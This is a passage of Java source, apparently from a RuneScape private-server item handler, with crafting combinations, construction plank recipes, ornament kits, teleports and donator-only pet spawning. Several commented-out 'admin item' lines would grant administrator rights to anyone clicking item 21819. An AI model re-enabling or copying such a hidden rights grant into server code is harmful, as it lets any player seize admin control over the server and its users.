				player.getInventory().addItem(4712, 1);
				player.getInventory().addItem(4714, 1);
                return;
                }
				
			//dharok		
				if (itemUsedId == 11848 && itemUsedWithId == 11848) {
				player.getInventory().deleteItem(11848, 1);
                player.getInventory().addItem(4716, 1);
				player.getInventory().addItem(4718, 1);
				player.getInventory().addItem(4720, 1);
				player.getInventory().addItem(4722, 1);
                return;
                }
				
			//guthan		
				if (itemUsedId == 11850 && itemUsedWithId == 11850) {
				player.getInventory().deleteItem(11850, 1);
                player.getInventory().addItem(4724, 1);
				player.getInventory().addItem(4726, 1);
				player.getInventory().addItem(4728, 1);
				player.getInventory().addItem(4730, 1);
                return;
                }
				
			//karil		
				if (itemUsedId == 11852 && itemUsedWithId == 11852) {
				player.getInventory().deleteItem(11852, 1);
                player.getInventory().addItem(4732, 1);
				player.getInventory().addItem(4734, 1);
				player.getInventory().addItem(4736, 1);
				player.getInventory().addItem(4738, 1);
                return;
                }
				
			//torag		
				if (itemUsedId == 11854 && itemUsedWithId == 11854) {
				player.getInventory().deleteItem(11854, 1);
                player.getInventory().addItem(4745, 1);
				player.getInventory().addItem(4747, 1);
				player.getInventory().addItem(4749, 1);
				player.getInventory().addItem(4751, 1);
                return;
                }
				
			//verac		
				if (itemUsedId == 11856 && itemUsedWithId == 11856) {
				player.getInventory().deleteItem(11856, 1);
                player.getInventory().addItem(4753, 1);
				player.getInventory().addItem(4755, 1);
				player.getInventory().addItem(4757, 1);
				player.getInventory().addItem(4759, 1);
                return;
                }
	//third age
				//melee		
				if (itemUsedId == 11858 && itemUsedWithId == 11858) {
				player.getInventory().deleteItem(11858, 1);
                player.getInventory().addItem(10350, 1);
				player.getInventory().addItem(10352, 1);
				player.getInventory().addItem(10348, 1);
				player.getInventory().addItem(10346, 1);
                return;
                }
				
				//range	
				if (itemUsedId == 11860 && itemUsedWithId == 11860) {
				player.getInventory().deleteItem(11860, 1);
                player.getInventory().addItem(10334, 1);
				player.getInventory().addItem(10330, 1);
				player.getInventory().addItem(10332, 1);
				player.getInventory().addItem(10336, 1);
                return;
                }
				
				//mage
				if (itemUsedId == 11862 && itemUsedWithId == 11862) {
				player.getInventory().deleteItem(11862, 1);
                player.getInventory().addItem(10342, 1);
				player.getInventory().addItem(10338, 1);
				player.getInventory().addItem(10340, 1);
				player.getInventory().addItem(10344, 1);
                return;
                }
	
		//Bug lantern

				//lant on tind		
				else if (itemUsedId == 7051 && itemUsedWithId == 590) {
				player.getInventory().deleteItem(7051, 1);
                player.getInventory().addItem(7053, 1);
				player.sm("You Light the lantern.");
                return;
                }
				
				//tind on lamp	
				else if (itemUsedId == 590 && itemUsedWithId == 7051) {
				player.getInventory().deleteItem(7051, 1);
                player.getInventory().addItem(7053, 1);
				player.sm("You Light the lantern.");
                return;
                }
//Gs test
				else if (itemUsed.getId() == 11692 && usedWith.getId() == 11710){
				player.getInventory().deleteItem(11692, 1);
				player.getInventory().deleteItem(11710, 1);
				player.getInventory().addItem(11690, 1);
				player.sm("You have made a godsword blade.");
				}
				
				else if (itemUsed.getId() == 11710 && usedWith.getId() == 11692){
				player.getInventory().deleteItem(11692, 1);
				player.getInventory().deleteItem(11710, 1);
				player.getInventory().addItem(11690, 1);
				player.sm("You have made a godsword blade.");
				}
//gs test end

//Goat horn dust
				else if (itemUsed.getId() == 4698 && usedWith.getId() == 233){
				player.getInventory().deleteItem(4698, 28);
				player.getInventory().addItem(9594, 28);
				player.sm("You crush them to dust.");
				}  

//Crystal key				
				else if (itemUsed.getId() == 987 && usedWith.getId() == 985){
				player.getInventory().deleteItem(985, 1);
				player.getInventory().deleteItem(987, 1);
				player.getInventory().addItem(989,1);
				player.sm("You made a crystal key.");
				}  
				
				else if (itemUsed.getId() == 985 && usedWith.getId() == 987){
				player.getInventory().deleteItem(985, 1);
				player.getInventory().deleteItem(987, 1);
				player.getInventory().addItem(989,1);
				player.sm("You made a crystal key.");
				}  
//SS attachments
		
	//Blessed Shields
				else if (itemUsed.getId() == 13734 && usedWith.getId() == 13754){
				player.getInventory().deleteItem(13754, 1);
				player.getInventory().deleteItem(13734, 1);
				player.getInventory().addItem(13736, 1);
				player.sm("You Blessed the Spirit Shield.");
				} 
				
				else if (itemUsed.getId() == 13754 && usedWith.getId() == 13734){
				player.getInventory().deleteItem(13754, 1);
				player.getInventory().deleteItem(13734, 1);
				player.getInventory().addItem(13736, 1);
				player.sm("You Blessed the Spirit Shield.");
				}
		
		
		
	//Full shields
	
			//arcane	
				else if (itemUsed.getId() == 13746 && usedWith.getId() == 13736){
				player.getInventory().deleteItem(13746, 1);
				player.getInventory().deleteItem(13736, 1);
				player.getInventory().addItem(13738, 1);
				player.sm("You add the Sigil to the Shield.");
				}
				
			//Elysian	
				else if (itemUsed.getId() == 13750 && usedWith.getId() == 13736){
				player.getInventory().deleteItem(13750, 1);
				player.getInventory().deleteItem(13736, 1);
				player.getInventory().addItem(13742, 1);
				player.sm("You add the Sigil to the Shield.");
				}
				
			//Divine
				else if (itemUsed.getId() == 13748 && usedWith.getId() == 13736){
				player.getInventory().deleteItem(13748, 1);
				player.getInventory().deleteItem(13736, 1);
				player.getInventory().addItem(13740, 1);
				player.sm("You add the Sigil to the Shield.");
				}
				
			//Spectral
				else if (itemUsed.getId() == 13752 && usedWith.getId() == 13736){
				player.getInventory().deleteItem(13752, 1);
				player.getInventory().deleteItem(13736, 1);
				player.getInventory().addItem(13744, 1);
				player.sm("You add the Sigil to the Shield.");
				}

//SS end


//Xmas event 2012

			//Firemaking
				else if (itemUsed.getId() == 19639 && usedWith.getId() == 590){ //Wood shards on tinderbox
					 if (player.getSkills().getLevel(Skills.FIREMAKING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Firemaking level of 70 to use this obstacle.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(733));			  
					player.getSkills().addXp(12, 5);
					player.getInventory().deleteItem(new Item(19639, 1));
					player.getInventory().addItem(1781, 1);  //ash
					player.getInventory().refresh();
					player.addStopDelay(12); }
					
					
			//ash
				else if (itemUsed.getId() == 1781 && usedWith.getId() == 1781){ //ash on ash
					 if (player.getSkills().getLevel(Skills.CRAFTING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Crafting level of 70 to fuse these ashes.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(148));
					player.getSkills().addXp(12, 5);
					player.getInventory().deleteItem(new Item(1781, 1));
					player.getInventory().addItem(15420, 1);  //presant
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
//Xmas end



//construction
			
			
			//Saw on....   saw= 8794 cyrstal= 9625  xp is 1.6k
			 
			
				//logs
				else if (itemUsed.getId() == 8794 && usedWith.getId() == 1511){ //saw on wood
					
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 1);
					player.getInventory().deleteItem(new Item(1511, 1));
					player.getInventory().addItem(960, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					//oak
				else if (itemUsed.getId() == 8794 && usedWith.getId() == 1521){ //saw on wood
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 20) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 20 to shape the wood.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 3);
					player.getInventory().deleteItem(new Item(1521, 1));
					player.getInventory().addItem(8778, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
				
					
					//teak
				else if (itemUsed.getId() == 8794 && usedWith.getId() == 6333){ //saw on wood
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 50) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 50 to shape the wood.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 5);
					player.getInventory().deleteItem(new Item(6333, 1));
					player.getInventory().addItem(8780, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
				
					
						//mahogony
				else if (itemUsed.getId() == 8794 && usedWith.getId() == 6332){ //saw on wood
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 70 to shape the wood.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 7);
					player.getInventory().deleteItem(new Item(6332, 1));
					player.getInventory().addItem(8782, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
			//plank workings.
			
			
					//logs
				else if (itemUsed.getId() == 960 && usedWith.getId() == 1755){ //tooth 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 15) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 15 to saw this plank.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 5);
					player.getInventory().deleteItem(new Item(960, 1));
					player.getInventory().addItem(15295, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
						//logs
				else if (itemUsed.getId() == 1755 && usedWith.getId() == 960){ //groove 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 15) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 15 to saw this plank.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 5);
					player.getInventory().deleteItem(new Item(960, 1));
					player.getInventory().addItem(15296, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
						//logs
				else if (itemUsed.getId() == 15296 && usedWith.getId() == 15295){ //wooden bench (pack) 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 18) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 18 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 8);
					player.getInventory().deleteItem(new Item(15296, 1));
					player.getInventory().deleteItem(new Item(15295, 1));
					player.getInventory().addItem(8562, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
			//OAK
				
				
							//logs
				else if (itemUsed.getId() == 8778 && usedWith.getId() == 8794){ //long plank 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 25) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 25 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 10);
					player.getInventory().deleteItem(new Item(8778, 1));
					player.getInventory().addItem(15293, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }

				
							//logs
				else if (itemUsed.getId() == 15293 && usedWith.getId() == 8794){ //short plank 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 25) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 25 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 12);
					player.getInventory().deleteItem(new Item(15293, 1));
					player.getInventory().addItem(15292, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
								//logs
				else if (itemUsed.getId() == 8794 && usedWith.getId() == 8778){ //diagonal cut plank 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 28) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 28 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 11);
					player.getInventory().deleteItem(new Item(8778, 1));
					player.getInventory().addItem(15294, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
					
					
								//logs
				else if (itemUsed.getId() == 8778 && usedWith.getId() == 9592){ //treated oak plank
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 30) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 30 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 12);
					player.getInventory().deleteItem(new Item(8778, 1));
					player.getInventory().deleteItem(new Item(9592, 1));
					player.getInventory().addItem(13238, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
									//logs
				else if (itemUsed.getId() == 8778 && usedWith.getId() == 1755){ //curved plank
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 35) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 35 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 14);
					player.getInventory().deleteItem(new Item(8778, 1));
					player.getInventory().addItem(15297, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
					
					else if (itemUsed.getId() == 15294 && usedWith.getId() == 13238){ //oak bench (pack)
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 28) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 28 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 12);
					player.getInventory().deleteItem(new Item(15294, 1));
					player.getInventory().deleteItem(new Item(13238, 1));
					player.getInventory().addItem(8564, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
				
									//logs
				else if (itemUsed.getId() == 8109 && usedWith.getId() == 2353){ //steel framed bench
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 28) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 28 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 12);
					player.getInventory().deleteItem(new Item(8109, 1));
					player.getInventory().deleteItem(new Item(2353, 1));
					player.getInventory().addItem(8377, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
										//logs
				else if (itemUsed.getId() == 8109 && usedWith.getId() == 9425){ //bench with vice
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 28) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 28 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 12);
					player.getInventory().deleteItem(new Item(8109, 1));
					player.getInventory().deleteItem(new Item(9425, 1));
					player.getInventory().addItem(8378, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
					

							//logs
				else if (itemUsed.getId() == 8109 && usedWith.getId() == 1207){ //bench with lathe
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 28) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 28 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 12);
					player.getInventory().deleteItem(new Item(8109, 1));
					player.getInventory().deleteItem(new Item(1207, 1));
					player.getInventory().addItem(8379, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
			//TEAK
			
			
						//logs
				else if (itemUsed.getId() == 8780 && usedWith.getId() == 1755){ //jointed plank
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 55) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 55 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 15);
					player.getInventory().deleteItem(new Item(8780, 1));
					player.getInventory().addItem(19637, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
					
					//logs
				else if (itemUsed.getId() == 19637 && usedWith.getId() == 15292){ //teak dining bench packed
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 60) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 60 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 16);
					player.getInventory().deleteItem(new Item(19637, 1));
					player.getInventory().deleteItem(new Item(15292, 1));
					player.getInventory().addItem(8568, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
				
					
							//logs
				else if (itemUsed.getId() == 8568 && usedWith.getId() == 1755){ //carved teak dining bench (pack)
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 65) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 65 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 18);
					player.getInventory().deleteItem(new Item(8568, 1));
					player.getInventory().addItem(8570, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
			
					
			//Mahogony

					
								//logs
				else if (itemUsed.getId() == 8782 && usedWith.getId() == 8794){ //mahogony bench (pack)
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 75) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 75 to saw this plank..",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(22, 20);
					player.getInventory().deleteItem(new Item(8782, 1));
					player.getInventory().addItem(8572, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
			
					
		//Construction end		


//dfs

						else if (itemUsed.getId() == 11286 && usedWith.getId() == 1540){ //Visage on shield
					if (player.getSkills().getLevel(Skills.SMITHING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Smithing level of 70 to saw this plank..",
								  true);
						  return;
					  }
					
					//player.setNextAnimation(new Animation(713));
					//player.setNextGraphics(new Graphics(354));
					//player.getSkills().addXp(22, 20);
					player.getInventory().deleteItem(new Item(1540, 1));
					player.getInventory().deleteItem(new Item(11286, 1));
					player.getInventory().addItem(11284, 1);  // DFS
					player.getInventory().refresh();
					player.addStopDelay(2); }



					else if (itemUsed.getId() == 1540 && usedWith.getId() == 11286){ //shield on visage
					if (player.getSkills().getLevel(Skills.SMITHING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Smithing level of 70 to saw this plank..",
								  true);
						  return;
					  }
					
					//player.setNextAnimation(new Animation(713));
					//player.setNextGraphics(new Graphics(354));
					//player.getSkills().addXp(22, 20);
					player.getInventory().deleteItem(new Item(1540, 1));
					player.getInventory().deleteItem(new Item(11286, 1));
					player.getInventory().addItem(11284, 1);  // DFS
					player.getInventory().refresh();
					player.addStopDelay(2); }
//(sp) kits	
				
				//D helm
				else if (itemUsed.getId() == 19354 && usedWith.getId() == 11335){
				player.getInventory().deleteItem(19354, 1);
				player.getInventory().deleteItem(11335, 1);
				player.getInventory().addItem(19341, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D legs
				else if (itemUsed.getId() == 19356 && usedWith.getId() == 4087){
				player.getInventory().deleteItem(19356, 1);
				player.getInventory().deleteItem(4087, 1);
				player.getInventory().addItem(19343, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D skirt
				else if (itemUsed.getId() == 19356 && usedWith.getId() == 4585){
				player.getInventory().deleteItem(19356, 1);
				player.getInventory().deleteItem(4585, 1);
				player.getInventory().addItem(19344, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D body
				else if (itemUsed.getId() == 19358 && usedWith.getId() == 14479){
				player.getInventory().deleteItem(19358, 1);
				player.getInventory().deleteItem(14479, 1);
				player.getInventory().addItem(19342, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D sq shield
				else if (itemUsed.getId() == 19360 && usedWith.getId() == 1187){
				player.getInventory().deleteItem(19360, 1);
				player.getInventory().deleteItem(1187, 1);
				player.getInventory().addItem(19345, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				
				
				
				

//(sp) end
					
//(or) kits	
				//Fury
				else if (itemUsed.getId() == 19333 && usedWith.getId() == 6585){
				player.getInventory().deleteItem(19333, 1);
				player.getInventory().deleteItem(6585, 1);
				player.getInventory().addItem(19335, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D helm
				else if (itemUsed.getId() == 19346 && usedWith.getId() == 11335){
				player.getInventory().deleteItem(19346, 1);
				player.getInventory().deleteItem(11335, 1);
				player.getInventory().addItem(19336, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D legs
				else if (itemUsed.getId() == 19348 && usedWith.getId() == 4087){
				player.getInventory().deleteItem(19348, 1);
				player.getInventory().deleteItem(4087, 1);
				player.getInventory().addItem(19338, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D skirt
				else if (itemUsed.getId() == 19348 && usedWith.getId() == 4585){
				player.getInventory().deleteItem(19348, 1);
				player.getInventory().deleteItem(4585, 1);
				player.getInventory().addItem(19339, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D body
				else if (itemUsed.getId() == 19350 && usedWith.getId() == 14479){
				player.getInventory().deleteItem(19350, 1);
				player.getInventory().deleteItem(14479, 1);
				player.getInventory().addItem(19337, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				//D sq shield
				else if (itemUsed.getId() == 19352 && usedWith.getId() == 1187){
				player.getInventory().deleteItem(19352, 1);
				player.getInventory().deleteItem(1187, 1);
				player.getInventory().addItem(19340, 1);
				player.sm("You add the ornament onto the item.");
				}
				
				
				
				
				

//(or) end

				else if (contains(1755, Gem.ONYX.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.ONYX);
				else
					player.getPackets().sendGameMessage(
							"Nothing interesting happens.");
				if (Settings.DEBUG)
					Logger.log("ItemHandler", "Used:" + itemUsed.getId()
							+ ", With:" + usedWith.getId());
			}
	}

	public static void handleItemOption3(Player player, int slotId, int itemId,
			Item item) {
			//admin item
		//if (itemId == 21819){
            //player.setRights(9); }
                

			
		long time = Utils.currentTimeMillis();
		if (player.getStopDelay() >= time
				|| player.getEmotesManager().getNextEmoteEnd() >= time)
			return;
		player.stopAll(false);
		if (itemId == 20767 || itemId == 20769 || itemId == 20771)
			SkillCapeCustomizer.startCustomizing(player, itemId);
		else if (Equipment.getItemSlot(itemId) == Equipment.SLOT_AURA)
			player.getAuraManager().sendTimeRemaining(itemId);
	}

	public static void handleItemOption4(Player player, int slotId, int itemId,
			Item item) {
		//System.out.println("Option 4");
		
		
	
	
	}

	public static void handleItemOption5(Player player, int slotId, int itemId,
			Item item) {
		//System.out.println("Option 5");
		
		//admin item		
		//if (itemId == 21819){
          //  player.setRights(12); }
                
	}

	public static void handleItemOption6(Player player, int slotId, int itemId,
			Item item) {
		long time = Utils.currentTimeMillis();
		if (player.getStopDelay() >= time
				|| player.getEmotesManager().getNextEmoteEnd() >= time)
			return;
		player.stopAll(false);
		Pouches pouches = Pouches.forId(itemId);
		if (pouches != null)
			Summoning.spawnFamiliar(player, pouches);
		else if (itemId == 1438)
			Runecrafting.locate(player, 3127, 3405);
		else if (itemId == 1440)
			Runecrafting.locate(player, 3306, 3474);
		else if (itemId == 1442)
			Runecrafting.locate(player, 3313, 3255);
		else if (itemId == 1444)
			Runecrafting.locate(player, 3185, 3165);
		else if (itemId == 1446)
			Runecrafting.locate(player, 3053, 3445);
		else if (itemId == 1448)
			Runecrafting.locate(player, 2982, 3514);
		else if (itemId <= 1712 && itemId >= 1706 || itemId >= 10354
				&& itemId <= 10362)
			player.getDialogueManager().startDialogue("Transportation",
					"Edgeville", new WorldTile(3087, 3496, 0), "Karamja",
					new WorldTile(2918, 3176, 0), "Draynor Village",
					new WorldTile(3105, 3251, 0), "Al Kharid",
					new WorldTile(3293, 3163, 0), itemId);
		else if (itemId == 1704 || itemId == 10362)
			player.getPackets()
			.sendGameMessage(
					"The amulet has ran out of charges. You need to recharge it if you wish it use it once more.");
		else if (itemId >= 3853 && itemId <= 3867)
			player.getDialogueManager().startDialogue("Transportation",
					"Burthrope Games Room", new WorldTile(2880, 3559, 0),
					"Barbarian Outpost", new WorldTile(2519, 3571, 0),
					"Gamers' Grotto", new WorldTile(2970, 9679, 0),
					"Corporeal Beast", new WorldTile(2886, 4377, 0), itemId);
					
					
		//else if (itemId == 21819)
          //      player.setRights(12);	
	}
	

	


	

	public static void handleItemOption7(Player player, int slotId, int itemId,
			Item item) {
			
			
		long time = System.currentTimeMillis();
		if (player.getStopDelay() >= time
				|| player.getEmotesManager().getNextEmoteEnd() >= time)
			return;
		player.stopAll(false);
		if (item.getDefinitions().isDestroyItem()) {
			player.getDialogueManager().startDialogue("DestroyItemOption",
					new Object[] { Integer.valueOf(slotId), item });
			return;
		}
		if (player.getCharges().degradeCompletly(item)) {
			return;
		}
		/**
		 * Pets
		 */
		 if (IsPet(itemId)){
		for(int i = 0; i < itempets.length; i++){ 
		if (itemId == itempets[i]){
			if (player.getPet() != null) {
				player.sendMessage("You already have a pet spawned, please dissmis it to spawn another.");
				return;
			}
	//Delete to make anyone have pets
			if (!player.isDonator()) {
					player.getPackets().sendGameMessage("You need to be a Donator to spawn pets.");
					return;
				}
	//Donator only pets end.
			player.setPetId(itempets[i]);
			new Pets(npcpets[i], player, new WorldTile(player.getX() + 1,
			player.getY() + 1, player.getPlane()), 0, false);
			player.getInventory().deleteItem(slotId, item);
			}

	}
	} else {
        player.getInventory().deleteItem(slotId, item);
        World.addGroundItem(item, new WorldTile(player), player, false, 180, true);
        player.getPackets().sendSound(2739, 0, 1);
	}
	}																																																																																																									//item top.		? ,    ? ,?, jeff , ?,   ?,   po,big po peepaw, big peepaw,nex,corp,small peepaw, jad						
	public static int[] itempets = {22973, 12196, 21512, 22992, 22993, 22994, 22995, 12469, 12470, 12471, 12472, 12473, 12474, 12475, 12476, 12481, 12482, 12484, 12485, 12487, 12488, 12489, 12490, 12492, 12493, 12496, 12497, 12498, 12499, 12500, 12501, 12502, 12503, 12505, 12506, 12507, 12508, 12509, 12510, 12511, 12512, 12513, 12514, 12515, 12516, 12517, 12518, 12519, 12520, 12521, 12523, 14627, 14626, 7581, 7582, 7583, 7584, /*   */7585, 3696, 3697, 90, 5328,432,6652, 4485, 20,1476,/**/6462,11808,14583,11791, 476, 943, 23058, 23060,  23062, 23064, 23066, 5333};
	public static int[] npcpets  = {2267,  6969,  3604,  14832, 14768, 14769, 14770,  6900,  6901,  6902,  6903,  6904,  6905,  6906,  6907,  6908,  6909,  6911,  6912,  6914,  6915,  6916,  6919,  6920,  6923,  6942,  6943,  6945,  6946,  6947,  6948,  6949,  6950,  6951,  6952,  6953,  6954,  6955,  6956,  6957,  6958,  6959,  6960,  6961,  6962,  6963,  6964,  6965,  6966,  6967,  6968,  8550,  8551, 3503, 3504, 3505, 3506,/*  */ 5603, 6779, 106,5025, 3681, 44,17154,17157, 17156, 17158,17159,17160,17161,17163, 17169, 17170, 17172, 17171, 17173, 17175, 17174, 6873};
	
	public static boolean IsPet(int j){
		for(int i : itempets){
			if (i != j){
				continue;
			}
				return true;
	
		}
			return false;
	}
}